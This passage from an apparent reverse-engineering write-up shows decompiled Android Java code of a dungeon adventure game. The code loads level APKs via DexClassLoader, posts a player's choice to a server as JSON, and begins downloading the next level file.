<span class="line"><span style="color:#DBD7CAEE">        Button</span><span style="color:#BD976A"> button4</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button4</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button4</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">returnFourthOption</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Class</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Object</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]));</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Context</span><span style="color:#BD976A"> context</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">t</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Resources</span><span style="color:#BD976A"> resources</span><span style="color:#666666"> =</span><span style="color:#BD976A"> context</span><span style="color:#666666">.</span><span style="color:#80A665">getResources</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41101078262054L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">        int</span><span style="color:#BD976A"> identifier</span><span style="color:#666666"> =</span><span style="color:#BD976A"> resources</span><span style="color:#666666">.</span><span style="color:#80A665">getIdentifier</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">returnQuestImage</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Class</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Object</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">drawable</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> context</span><span style="color:#666666">.</span><span style="color:#80A665">getPackageName</span><span style="color:#666666">());</span></span>
<span class="line"><span style="color:#C99076">        this</span><span style="color:#666666">.</span><span style="color:#BD976A">v</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> identifier</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#C99076">        this</span><span style="color:#666666">.</span><span style="color:#BD976A">t</span><span style="color:#666666">.</span><span style="color:#80A665">setImageResource</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">identifier</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        ((</span><span style="color:#DBD7CAEE">TextView</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">textView</span><span style="color:#666666">)).</span><span style="color:#80A665">setText</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">returnStory</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Class</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Object</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]));</span></span>
<span class="line"><span style="color:#BD976A">        button</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button2</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button3</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button4</span><span style="color:#666666">.</span><span style="color:#80A665">setOnClickListener</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">    }</span><span style="color:#4D9375"> catch</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">ClassNotFoundException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> IllegalAccessException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> IllegalArgumentException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> InstantiationException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> NoSuchMethodException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> InvocationTargetException </span><span style="color:#BD976A">e2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">        e2</span><span style="color:#666666">.</span><span style="color:#80A665">printStackTrace</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>Inside this <code>onCreate</code>, the app will load the level apk by building the correct path like this <code>getDir("LevelDir", 0).getAbsolutePath() + / + LevelNumber_intent_extra + .apk</code> and its class like this <code>com.example. + LevelNumber_intent_extra.toLowerCase() + . + LevelNumber_intent_extra</code> (for example: Level01 become <code>com.example.level01.Level01</code>), using <code>DexClassLoader</code>.</p>
<p>Here’s <code>Level01</code> as an example:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> class</span><span style="color:#5DA994"> Level01</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnQuestImage</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">dungeongate</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnFirstOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try going through the dark corridor</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnSecondOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try lighting one of the torch</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnThirdOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try throwing an object across the corridor!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnFourthOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Go back to home...</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnStory</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">As soon as you enter the dungeon you find yourself with a long dark corridor in front of you.... There is little light.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">gameStory</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">String </span><span style="color:#BD976A">str</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">{</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">Level</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">:</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">Level01</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">,</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">Choise</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">:</span><span style="color:#C99076">\"</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> str </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p><code>returnQuestImage</code> is the image, then there are the four options for the buttons, the story and <code>gameStory</code> is the JSON that the app will send to the server.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> onClick</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">View view</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    Context</span><span style="color:#BD976A"> context</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">    long</span><span style="color:#BD976A"> j2</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getId</span><span style="color:#666666">()</span><span style="color:#CB7676"> ==</span><span style="color:#BD976A"> R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button4</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">        view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">().</span><span style="color:#80A665">startActivity</span><span style="color:#666666">(</span><span style="color:#4D9375">new</span><span style="color:#80A665"> Intent</span><span style="color:#666666">(</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">(),</span><span style="color:#BD976A"> D</span><span style="color:#666666">.</span><span style="color:#BD976A">class</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#4D9375">    try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Object</span><span style="color:#BD976A"> newInstance</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">newInstance</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Class</span><span style="color:#666666">&#x3C;</span><span style="color:#CB7676">?</span><span style="color:#666666">></span><span style="color:#BD976A"> cls</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41521985057062L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Method</span><span style="color:#BD976A"> method</span><span style="color:#666666"> =</span><span style="color:#BD976A"> cls</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gameStory</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> String</span><span style="color:#666666">.</span><span style="color:#BD976A">class</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">        Object</span><span style="color:#666666">[]</span><span style="color:#BD976A"> objArr</span><span style="color:#666666"> =</span><span style="color:#666666"> {((</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getId</span><span style="color:#666666">())).</span><span style="color:#80A665">getText</span><span style="color:#666666">()};</span></span>
<span class="line"><span style="color:#DBD7CAEE">        b bVar </span><span style="color:#666666">=</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> b</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        bVar</span><span style="color:#666666">.</span><span style="color:#80A665">execute</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1856r</span><span style="color:#666666">,</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#BD976A"> method</span><span style="color:#666666">.</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> objArr</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41547754860838L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        JSONObject</span><span style="color:#BD976A"> jSONObject</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> JSONObject</span><span style="color:#666666">(</span><span style="color:#BD976A">bVar</span><span style="color:#666666">.</span><span style="color:#80A665">get</span><span style="color:#666666">());</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41569229697318L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41573524664614L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41560639762726L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        String</span><span style="color:#BD976A"> string</span><span style="color:#666666"> =</span><span style="color:#BD976A"> jSONObject</span><span style="color:#666666">.</span><span style="color:#80A665">getString</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">response</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41461855514918L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        String</span><span style="color:#BD976A"> string2</span><span style="color:#666666"> =</span><span style="color:#BD976A"> jSONObject</span><span style="color:#666666">.</span><span style="color:#80A665">getString</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">endpoint</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">        this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1858u</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">string</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41380251136294L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">string</span><span style="color:#666666">.</span><span style="color:#80A665">startsWith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">SUCCEDED:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42033086165286L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">string</span><span style="color:#666666">.</span><span style="color:#80A665">startsWith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">DEAD:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">                this</span><span style="color:#666666">.</span><span style="color:#BD976A">t</span><span style="color:#666666">.</span><span style="color:#80A665">setImageResource</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">drawable</span><span style="color:#666666">.</span><span style="color:#BD976A">hastygrave</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span><span style="color:#4D9375"> else</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#C99076">                this</span><span style="color:#666666">.</span><span style="color:#BD976A">t</span><span style="color:#666666">.</span><span style="color:#80A665">setImageResource</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">v</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#C99076">        this</span><span style="color:#666666">.</span><span style="color:#BD976A">t</span><span style="color:#666666">.</span><span style="color:#80A665">setImageResource</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">drawable</span><span style="color:#666666">.</span><span style="color:#BD976A">biceps</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Context</span><span style="color:#BD976A"> applicationContext</span><span style="color:#666666"> =</span><span style="color:#80A665"> getApplicationContext</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41406020940070L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        SharedPreferences</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Editor</span><span style="color:#BD976A"> edit</span><span style="color:#666666"> =</span><span style="color:#BD976A"> applicationContext</span><span style="color:#666666">.</span><span style="color:#80A665">getSharedPreferences</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelCompleted</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">).</span><span style="color:#80A665">edit</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        StringBuilder</span><span style="color:#BD976A"> sb</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> StringBuilder</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41350186365222L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Status</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        edit</span><span style="color:#666666">.</span><span style="color:#80A665">putBoolean</span><span style="color:#666666">(</span><span style="color:#BD976A">sb</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#666666">(),</span><span style="color:#4D9375"> true</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        edit</span><span style="color:#666666">.</span><span style="color:#80A665">apply</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41242812182822L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        ((</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button4</span><span style="color:#666666">)).</span><span style="color:#80A665">setText</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Return to main menu</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        a aVar </span><span style="color:#666666">=</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> a</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42290784203046L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">        String</span><span style="color:#BD976A"> str</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">        char</span><span style="color:#BD976A"> c</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 65535</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">        switch</span><span style="color:#666666"> (</span><span style="color:#BD976A">str</span><span style="color:#666666">.</span><span style="color:#80A665">hashCode</span><span style="color:#666666">())</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            case</span><span style="color:#4C9A91"> 1734436965</span><span style="color:#4D9375">:</span></span>
<span class="line"><span style="color:#BD976A">                e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42295079170342L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#666666"> (</span><span style="color:#BD976A">str</span><span style="color:#666666">.</span><span style="color:#80A665">equals</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level01</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    c </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">                    break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#4D9375">                break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            case</span><span style="color:#4C9A91"> 1734436966</span><span style="color:#4D9375">:</span></span>
<span class="line"><span style="color:#BD976A">                e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42329438908710L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#666666"> (</span><span style="color:#BD976A">str</span><span style="color:#666666">.</span><span style="color:#80A665">equals</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level02</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    c </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">                    break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#4D9375">                break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            case</span><span style="color:#4C9A91"> 1734436967</span><span style="color:#4D9375">:</span></span>
<span class="line"><span style="color:#BD976A">                e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42226359693606L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#666666"> (</span><span style="color:#BD976A">str</span><span style="color:#666666">.</span><span style="color:#80A665">equals</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level03</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    c </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">                    break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">                }</span></span>
<span class="line"><span style="color:#4D9375">                break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">c </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42260719431974L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">            aVar</span><span style="color:#666666">.</span><span style="color:#80A665">execute</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1855q</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> string2</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level02.apk</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42174820086054L</span><span style="color:#666666">));</span></span>
